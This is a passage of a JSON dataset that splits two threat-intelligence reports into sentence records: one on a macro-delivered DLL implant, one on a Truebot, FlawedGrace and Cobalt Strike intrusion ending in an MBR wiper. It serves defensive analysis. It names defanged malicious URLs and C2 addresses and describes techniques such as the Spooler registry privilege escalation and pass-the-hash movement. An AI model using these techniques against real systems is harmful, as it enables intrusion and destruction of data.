        "id": "cti_reports_filtered/r-1274.md:::S86",
        "text": "- 32-bit keys that mimic a Windows SID \n",
        "type": "",
        "report": "r-1274",
        "line": 86,
        "index": 3453
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S87",
        "text": "  - The first parameter belongs to the decryption key used to start the malicious activity. \n",
        "type": "",
        "report": "r-1274",
        "line": 87,
        "index": 3454
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S88",
        "text": "  - This could be chosen by the author to make the value more realistic\n",
        "type": "",
        "report": "r-1274",
        "line": 88,
        "index": 3455
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S89",
        "text": "- Campaign ID\n",
        "type": "",
        "report": "r-1274",
        "line": 89,
        "index": 3456
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S90",
        "text": "The analysis of the DLL extracted from the \u2018docm\u2019 files (the 2nd stage of the infection) revealed the existence of two types of operation for these DLLs:\n",
        "type": "",
        "report": "r-1274",
        "line": 90,
        "index": 3457
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S91",
        "text": "The DLL unpacks a new payload in the system.\n",
        "type": "",
        "report": "r-1274",
        "line": 91,
        "index": 3458
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S92",
        "text": "The DLL downloads a new DLL implant from a remote server delivering an additional DLL payload into the system.\n",
        "type": "",
        "report": "r-1274",
        "line": 92,
        "index": 3459
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S93",
        "text": "For both methods, the implant starts collecting the target information and then contacts the command and control (C2) server\n",
        "type": "",
        "report": "r-1274",
        "line": 93,
        "index": 3460
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S94",
        "text": "We focused our analysis into the DLLs files that are unpacked into the system.\n",
        "type": "",
        "report": "r-1274",
        "line": 94,
        "index": 3461
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S95",
        "text": "The DLL implant will be executed after the user interacts by opening the Office file.",
        "type": "",
        "report": "r-1274",
        "line": 95,
        "index": 3462
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S96",
        "text": "As we explained, the p-code of the VBA macro contains parts of the parameters needed to execute the implant into the system.",
        "type": "",
        "report": "r-1274",
        "line": 96,
        "index": 3463
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S97",
        "text": "The new DLL implant file will be unpacked (depending of the campaign ID) inside a folder inside the AppData folder of the user in execution:\n",
        "type": "",
        "report": "r-1274",
        "line": 97,
        "index": 3464
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S98",
        "text": "The DLL file, must be launched with 5 different parameters if we want to observe the malicious connection within the C2 domain; in our analysis we observed how the DLL was launched with the following command line:\n",
        "type": "",
        "report": "r-1274",
        "line": 98,
        "index": 3465
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S99",
        "text": "The required parameters to launch the malicious implant are:\n",
        "type": "",
        "report": "r-1274",
        "line": 99,
        "index": 3466
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S100",
        "text": "As we explained, the implants are patched SQLITE files and that is why we could find additional functions that are used to launch the malicious implant, executing the binary with certain parameters.",
        "type": "",
        "report": "r-1274",
        "line": 100,
        "index": 3467
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S101",
        "text": "It is necessary to use a specific export \u2018sqlite3_steps\u2019 plus the parameters mentioned before.",
        "type": "",
        "report": "r-1274",
        "line": 101,
        "index": 3468
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S102",
        "text": "Analyzing the code statically we could observe that the payload only checks 2 of these 5 parameters but all of them must be present in order to execute the implant:\n",
        "type": "",
        "report": "r-1274",
        "line": 102,
        "index": 3469
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S103",
        "text": "Attackers are always trying to remain undetected in their intrusions which is why it is common to observe techniques such as mimicking the same User-Agent that is present in the system, in order to remain under the radar.",
        "type": "",
        "report": "r-1274",
        "line": 103,
        "index": 3470
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S104",
        "text": "Using the same User-Agent string from the victim\u2019s web browser configurations, for example, will help avoid network-based detection systems from flagging outgoing traffic as suspicious.",
        "type": "",
        "report": "r-1274",
        "line": 104,
        "index": 3471
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S105",
        "text": "In this case, we observed how, through the use of the Windows API ObtainUserAgentString, the attacker obtained the User-Agent and used the value to connect to the command and control server:\n",
        "type": "",
        "report": "r-1274",
        "line": 105,
        "index": 3472
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S106",
        "text": "If the implant cannot detect the User-Agent in the system, it will use the default Mozilla User-Agent instead:\n",
        "type": "",
        "report": "r-1274",
        "line": 106,
        "index": 3473
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S107",
        "text": "Running the sample dynamically and intercepting the TLS traffic, we could see the connection to the command and control server:\n",
        "type": "",
        "report": "r-1274",
        "line": 107,
        "index": 3474
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S108",
        "text": "Unfortunately, during our analysis, the C2 was not active which limited our ability for further analysis.\n",
        "type": "",
        "report": "r-1274",
        "line": 108,
        "index": 3475
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S109",
        "text": "The data sent to the C2 channel contains the following information:\n",
        "type": "",
        "report": "r-1274",
        "line": 109,
        "index": 3476
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S110",
        "text": "We could find at least 5 different campaign IDs in our analysis, which suggests that the analysis in this document is merely the tip of the iceberg:\n",
        "type": "",
        "report": "r-1274",
        "line": 110,
        "index": 3477
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S111",
        "text": "Dotx file Campaign ID 61.dotm 0 17.dotm 17 43.dotm 43 83878C91171338902E0FE0FB97A8C47A.dotm 204 ******_dds_log 100\n",
        "type": "",
        "report": "r-1274",
        "line": 111,
        "index": 3478
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S112",
        "text": "In our analysis we could observe how the adversary ensures persistence by delivering an LNK file into the startup folder\n",
        "type": "",
        "report": "r-1274",
        "line": 112,
        "index": 3479
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S113",
        "text": "The value of this persistent LNK file is hardcoded inside every sample:\n",
        "type": "",
        "report": "r-1274",
        "line": 113,
        "index": 3480
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S114",
        "text": "Dynamically, and through the Windows APIs NtCreateFile and NtWriteFile, the LNK is written in the startup folder.",
        "type": "",
        "report": "r-1274",
        "line": 114,
        "index": 3481
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S115",
        "text": "The LNK file contains the path to execute the DLL file with the required parameters.",
        "type": "",
        "report": "r-1274",
        "line": 115,
        "index": 3482
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S0",
        "text": "In this case, Truebot was delivered through a Traffic Distribution System (TDS) reported by Proofpoint as \u201c404 TDS\u201d.",
        "type": "",
        "report": "r-dfir-1",
        "line": 0,
        "index": 3483
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S1",
        "text": "This campaign, observed in May 2023, leveraged email for the initial delivery mechanism.",
        "type": "",
        "report": "r-dfir-1",
        "line": 1,
        "index": 3484
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S2",
        "text": "After clicking-through the link in an email, the victim would be redirected through a series of URLs before being presented a file download at the final landing page.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 2,
        "index": 3485
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S3",
        "text": "The file download was a Truebot executable, which appeared as a fake Adobe Acrobat document.",
        "type": "",
        "report": "r-dfir-1",
        "line": 3,
        "index": 3486
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S4",
        "text": "After executing the file, Truebot copied and renamed itself.",
        "type": "",
        "report": "r-dfir-1",
        "line": 4,
        "index": 3487
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S5",
        "text": "Minutes later, Truebot loaded FlawedGrace onto the host.",
        "type": "",
        "report": "r-dfir-1",
        "line": 5,
        "index": 3488
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S6",
        "text": "While loading this malware, it used a series of modifications to the registry and Print Spooler service to both escalate privileges and establish persistence.",
        "type": "",
        "report": "r-dfir-1",
        "line": 6,
        "index": 3489
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S7",
        "text": "From there, FlawedGrace\u2019s execution routine involved storing as well as extracting, encoded and encrypted payloads in registry; the creation of temporary scheduled tasks and the injection of the final payload into msiexec.exe and svchost.exe.",
        "type": "",
        "report": "r-dfir-1",
        "line": 7,
        "index": 3490
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S8",
        "text": "After this execution, the threat actors proceeded to disable Windows Defender Real-Time monitoring and added exclusions for executable files on the host.",
        "type": "",
        "report": "r-dfir-1",
        "line": 8,
        "index": 3491
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S9",
        "text": "We later observed FlawedGrace creating a temporary user within the local Administrators and Remote Desktop Users groups.",
        "type": "",
        "report": "r-dfir-1",
        "line": 9,
        "index": 3492
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S10",
        "text": "With this user, a tunneled RDP connection was attempted from FlawedGrace\u2019s C2 servers.",
        "type": "",
        "report": "r-dfir-1",
        "line": 10,
        "index": 3493
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S11",
        "text": "Seemingly without success, the threat actors removed the user after 15 minutes before repeating the procedure a second time.",
        "type": "",
        "report": "r-dfir-1",
        "line": 11,
        "index": 3494
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S12",
        "text": "After the second failed attempt, the threat actors removed the user and did not attempt further RDP communications.",
        "type": "",
        "report": "r-dfir-1",
        "line": 12,
        "index": 3495
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S13",
        "text": "The FlawedGrace process then performed discovery surrounding the domain administrators and domain controllers.",
        "type": "",
        "report": "r-dfir-1",
        "line": 13,
        "index": 3496
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S14",
        "text": "Approximately two hours after the initial execution, Truebot loaded Cobalt Strike into memory and then went dormant for the next two hours.",
        "type": "",
        "report": "r-dfir-1",
        "line": 14,
        "index": 3497
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S15",
        "text": "This ended the use of Truebot for the rest of the intrusion, with FlawedGrace and Cobalt Strike being leveraged for the rest of the threat actors activity.",
        "type": "",
        "report": "r-dfir-1",
        "line": 15,
        "index": 3498
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S16",
        "text": "Now, four hours into the intrusion the threat actors, through the Cobalt Strike beacon, started another round of discovery commands using net, nltest, tasklist and AdFind.exe.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 16,
        "index": 3499
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S17",
        "text": "After having accessed LSASS memory on the beachhead host, the threat actors leveraged a local administrator hash to perform pass-the-hash lateral movement through the environment.",
        "type": "",
        "report": "r-dfir-1",
        "line": 17,
        "index": 3500
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S18",
        "text": "The threat actors used Impacket\u2019s atexec to execute discovery commands on remote hosts.",
        "type": "",
        "report": "r-dfir-1",
        "line": 18,
        "index": 3501
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S19",
        "text": "These discovery commands included the PowerShell, cmdlet Get-MpComputerStatus, and quser.",
        "type": "",
        "report": "r-dfir-1",
        "line": 19,
        "index": 3502
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S20",
        "text": "After these discovery commands, the threat actors used Cobalt Strike\u2019s jump psexec module to further move between hosts.",
        "type": "",
        "report": "r-dfir-1",
        "line": 20,
        "index": 3503
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S21",
        "text": "Following each lateral movement action, Cobalt Strike loaded FlawedGrace in memory on all hosts accessed by the adversary.",
        "type": "",
        "report": "r-dfir-1",
        "line": 21,
        "index": 3504
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S22",
        "text": "Around five hours post initial access, the threat actors went silent.",
        "type": "",
        "report": "r-dfir-1",
        "line": 22,
        "index": 3505
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S23",
        "text": "FlawedGrace and Cobalt Strike went dormant on all hosts except the beachhead system.",
        "type": "",
        "report": "r-dfir-1",
        "line": 23,
        "index": 3506
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S24",
        "text": "Seventeen hours later, the threat actors returned to the network and issued enumeration commands to discover network shares.",
        "type": "",
        "report": "r-dfir-1",
        "line": 24,
        "index": 3507
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S25",
        "text": "Around that time, we observed signs of data exfiltration from the environment.",
        "type": "",
        "report": "r-dfir-1",
        "line": 25,
        "index": 3508
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S26",
        "text": "Roughly four hours after the exfiltration began, merely 29 hours into the intrusion, the threat actors deployed the MBR Killer wiper on all hosts where FlawedGrace had been running, including a file server.",
        "type": "",
        "report": "r-dfir-1",
        "line": 26,
        "index": 3509
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S27",
        "text": "This executable overwrote the MBR (Master Boot Record) and triggered a reboot, rendering the hosts unusable.",
        "type": "",
        "report": "r-dfir-1",
        "line": 27,
        "index": 3510
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S28",
        "text": "Numerous systems were left at the boot screen, inoperable.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 28,
        "index": 3511
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S29",
        "text": "Following these actions, the threat actors lost all footholds to the network.",
        "type": "",
        "report": "r-dfir-1",
        "line": 29,
        "index": 3512
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S30",
        "text": "While data has been exfiltrated, no responsibility has been claimed and no extortion notes were found.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 30,
        "index": 3513
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S31",
        "text": "As is the case for many intrusions, initial access was obtained through an email campaign.",
        "type": "",
        "report": "r-dfir-1",
        "line": 31,
        "index": 3514
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S32",
        "text": "Reports by Proofpoint point to this campaign using the 404 Traffic Distribution System (TDS) service.",
        "type": "",
        "report": "r-dfir-1",
        "line": 32,
        "index": 3515
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S33",
        "text": "The following Proofpoint screenshots highlight how \u201c404 TDS\u201d is leveraged to turn email campaigns into drive-by downloads.",
        "type": "",
        "report": "r-dfir-1",
        "line": 33,
        "index": 3516
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S34",
        "text": "During this intrusion, the TDS redirection was reported by Proofpoint as follows:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 34,
        "index": 3517
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S35",
        "text": "The resulting hxxps[://]ecorfan[.]org/base/sj/Document_may_24_16654[.]exe URL performed a drive-by download, delivering the initial Truebot payload Document_may_24_16654.exe.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 35,
        "index": 3518
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S36",
        "text": "The usage of the deceptive Document_may_24_16654.exe naming would then entice fooled users to open what they believe is a recent document.",
        "type": "",
        "report": "r-dfir-1",
        "line": 36,
        "index": 3519
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S37",
        "text": "Truebot was used to load both Cobalt Strike and FlawedGrace on the initial host.",
        "type": "",
        "report": "r-dfir-1",
        "line": 37,
        "index": 3520
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S38",
        "text": "The payload, Document_may_24_16654.exe, imitated a PDF document by using an icon of an Adobe Acrobat document.",
        "type": "",
        "report": "r-dfir-1",
        "line": 38,
        "index": 3521
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S39",
        "text": "This was further enforced upon the user when the malware created the following message claiming Adobe Acrobat failed to open the file (even if Acrobat was not installed on the target system).\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 39,
        "index": 3522
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S40",
        "text": "Truebot\u2019s first action was to create an exact copy of itself in the following path and then execute it.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 40,
        "index": 3523
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S41",
        "text": "The newly created copy reached out to the Truebot C2 of essadonio[.]com (45.182.189[.]71).\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 41,
        "index": 3524
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S42",
        "text": "Truebot spawned an instance of C:\\Windows\\system32\\cmd.exe which was followed-up by a remote thread created in the new process.",
        "type": "",
        "report": "r-dfir-1",
        "line": 42,
        "index": 3525
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S43",
        "text": "The memory of cmd.exe clearly indicated signs of injection, as seen below, where a section of memory was set to execute and read write as well as the telltale MZ (0x4d5a) header of a PE binary.",
        "type": "",
        "report": "r-dfir-1",
        "line": 43,
        "index": 3526
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S44",
        "text": "Further investigation identified the injected module beacon.dll at the same offset as above (0x164a2fb0000) in the loaded modules of the target process.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 44,
        "index": 3527
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S45",
        "text": "This is the default naming convention for generating payloads from Cobalt Strike, and stands out further as the DLL did not have a path on disk.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 45,
        "index": 3528
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S46",
        "text": "This Cobalt Strike beacon was used both to query information and move around the network which will be discussed in later sections.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 46,
        "index": 3529
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S47",
        "text": "During the intrusion, the process running the beacon spawned the following process command line:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 47,
        "index": 3530
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S48",
        "text": "As we have observed in previous cases, threat actors make mistakes too!",
        "type": "",
        "report": "r-dfir-1",
        "line": 48,
        "index": 3531
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S49",
        "text": "In this case, the shell argument is a beacon command to spawn a new process.",
        "type": "",
        "report": "r-dfir-1",
        "line": 49,
        "index": 3532
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S50",
        "text": "Here, we see it mashed between two commands indicating human error.",
        "type": "",
        "report": "r-dfir-1",
        "line": 50,
        "index": 3533
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S51",
        "text": "Truebot loaded another more complicated payload alongside Cobalt Strike, the Remote Access Trojan (RAT) \u201cFlawedGrace.\u201d",
        "type": "",
        "report": "r-dfir-1",
        "line": 51,
        "index": 3534
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S52",
        "text": "The initial execution chain of this malware was observed across multiple endpoints when they were first infected.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 52,
        "index": 3535
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S53",
        "text": "The first observed behavior of this chain was to create a new instance of spoolsv.exe that was shortly accessed by the Truebot process (RuntimeBroker.exe).",
        "type": "",
        "report": "r-dfir-1",
        "line": 53,
        "index": 3536
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S54",
        "text": "This process would then spawn instances of msiexec.exe, which would reach out to the initial FlawedGrace C2 of 92.118.36[.]199.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 54,
        "index": 3537
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S55",
        "text": "Instead of creating a task through schtasks.exe, FlawedGrace used three different methods to create new scheduled tasks.",
        "type": "",
        "report": "r-dfir-1",
        "line": 55,
        "index": 3538
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S56",
        "text": "The first was to import the taskschd.dll library into the main host process to create a new task called 2.",
        "type": "",
        "report": "r-dfir-1",
        "line": 56,
        "index": 3539
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S57",
        "text": "The task was removed as soon as the new command gained SYSTEM-level privileges.",
        "type": "",
        "report": "r-dfir-1",
        "line": 57,
        "index": 3540
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S58",
        "text": "The second was observed within obfuscated PowerShell, where the Schedule.Service COM Object was used to create a new task.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 58,
        "index": 3541
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S59",
        "text": "The last method was to use native PowerShell cmdlets to register a task.",
        "type": "",
        "report": "r-dfir-1",
        "line": 59,
        "index": 3542
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S60",
        "text": "The initial task \\2 ran the following command which was scheduled for the next minute after creation:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 60,
        "index": 3543
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S61",
        "text": "The first working part of the command decodes the obfuscated string and results in the following PowerShell code:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 61,
        "index": 3544
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S62",
        "text": "The decoded code sets the variable $j to the value {8D81676C-7F63-8F81-676E-666B6C67818D}.",
        "type": "",
        "report": "r-dfir-1",
        "line": 62,
        "index": 3545
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S63",
        "text": "It then reads a value from the Windows Registry under the SOFTWARE\\2\\CLSID\\{8D81676C-7F63-8F81-676E-666B6C67818D}\\Type key, converts the value to a UTF-8 string, and executes it.",
        "type": "",
        "report": "r-dfir-1",
        "line": 63,
        "index": 3546
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S64",
        "text": "Based on script block logging, the PowerShell script contained in the registry would manipulate and populate further registry keys in the HKLM:\\Software\\Classes\\CLSID\\ key using HKLM:\\Software\\2\\CLSID as a staging location.",
        "type": "",
        "report": "r-dfir-1",
        "line": 64,
        "index": 3547
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S65",
        "text": "The malware created specific key names attempting to blend in with other COM objects which were also kept within this location.",
        "type": "",
        "report": "r-dfir-1",
        "line": 65,
        "index": 3548
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S66",
        "text": "The malware would create additional scheduled tasks using one of the following names selected randomly:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 66,
        "index": 3549
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S67",
        "text": "The final loaded PowerShell script was stored here:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 67,
        "index": 3550
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S68",
        "text": "The PowerShell code in TypeLib would decrypt the RC4 encrypted payload stored in ProgID using a key based on the hostname ($env:COMPUTERNAME) of the target host and then inject the DLL into the FlawedGrace msiexec.exe and svchost.exe processes.",
        "type": "",
        "report": "r-dfir-1",
        "line": 68,
        "index": 3551
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S69",
        "text": "We manually reversed the RC4 function to decrypt the DLL, which matched the same hash as the FlawedGrace processes in memory (c.dll)\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 69,
        "index": 3552
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S70",
        "text": "The PE details of the injected module c.dll was of a DLL with an original name of icuin.dll, claiming to be part of the International Components for Unicode libraries, as see below:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 70,
        "index": 3553
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S71",
        "text": "When FlawedGrace attempted to run certain commands on the target host, it displayed the specific behavior of spawning an instance of cmd.exe as a sacrificial intermediate process.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 71,
        "index": 3554
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S72",
        "text": "Shortly after these instances of cmd.exe were spawned, they would be accessed by the FlawedGrace process svchost.exe.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 72,
        "index": 3555
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S73",
        "text": "Of note, the arguments in these processes command lines used flags that do not exist (/I, /SI, /O, /SO):\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 73,
        "index": 3556
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S74",
        "text": "A Sigma rule to detect this activity can be found at the end of the report.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 74,
        "index": 3557
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S75",
        "text": "Threat actors established persistence on all infected hosts they pivoted to in the network.",
        "type": "",
        "report": "r-dfir-1",
        "line": 75,
        "index": 3558
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S76",
        "text": "The scheduled tasks were configured to load FlawedGrace using PowerShell.",
        "type": "",
        "report": "r-dfir-1",
        "line": 76,
        "index": 3559
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S77",
        "text": "While the tasks created initially to run FlawedGrace were registered with the task name of \\2 , tasks created for persistence used a naming convention mimicking various system tasks and placed under the \\Microsoft\\Windows\\ task path.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 77,
        "index": 3560
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S78",
        "text": "These tasks were then set up for a BootTrigger to restart the malware.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 78,
        "index": 3561
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S79",
        "text": "Please refer to the \u201cFlawedGrace\u201d portion of the Execution section for details on the different execution methods threat actors used to register these scheduled tasks.",
        "type": "",
        "report": "r-dfir-1",
        "line": 79,
        "index": 3562
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S80",
        "text": "On the beachhead host, the threat actors added a user account named adminr.",
        "type": "",
        "report": "r-dfir-1",
        "line": 80,
        "index": 3563
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S81",
        "text": "This account was then added to the Local Administrators group and Remote Desktop Users group.",
        "type": "",
        "report": "r-dfir-1",
        "line": 81,
        "index": 3564
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S82",
        "text": "The account was observed being used to test RDP tunneling in the environment.",
        "type": "",
        "report": "r-dfir-1",
        "line": 82,
        "index": 3565
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S83",
        "text": "This account was added and removed several times, but after the first three hours of access, it was deleted and not re-added by the threat actors.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 83,
        "index": 3566
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S84",
        "text": "We believe that to elevate their privileges, the threat actor might have abused an odd default Windows behavior surrounding changing service permissions:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 84,
        "index": 3567
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S85",
        "text": "The change in required [service] privileges takes effect the next time the service is started.",
        "type": "",
        "report": "r-dfir-1",
        "line": 85,
        "index": 3568
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S86",
        "text": "[\u2026",
        "type": "",
        "report": "r-dfir-1",
        "line": 86,
        "index": 3569
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S87",
        "text": "]",
        "type": "",
        "report": "r-dfir-1",
        "line": 87,
        "index": 3570
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S88",
        "text": "If you do not set the required privileges, the SCM uses all the privileges assigned by default to the process token.",
        "type": "",
        "report": "r-dfir-1",
        "line": 88,
        "index": 3571
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S89",
        "text": "\u2013 Source\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 89,
        "index": 3572
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S90",
        "text": "To abuse this SCM behavior, the threat actors were seen stopping the Spooler service before deleting the service\u2019s HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Spooler\\RequiredPrivileges registry entry, restarting the service and injecting into the newly created spoolsv.exe process.",
        "type": "",
        "report": "r-dfir-1",
        "line": 90,
        "index": 3573
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S91",
        "text": "The effect of deleting the RequiredPrivileges registry entry can be observed in the following screenshots where the post-modification spoolsv.exe process is seen with a flurry of additional permissions, all of which the threat actors may enjoy post-injection.",
        "type": "",
        "report": "r-dfir-1",
        "line": 91,
        "index": 3574
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S92",
        "text": "Scheduled tasks were used by the threat actors to run much of their malware as SYSTEM.",
        "type": "",
        "report": "r-dfir-1",
        "line": 92,
        "index": 3575
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S93",
        "text": "The initial execution tasks for FlawedGrace used the \\2 registered task were created to run under SYSTEM as seen by the Author in the task details.",
        "type": "",
        "report": "r-dfir-1",
        "line": 93,
        "index": 3576
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S94",
        "text": "This could then be seen with the user NT AUTHORITY\\SYSTEM running the task command and arguments in process creation logs.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 94,
        "index": 3577
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S95",
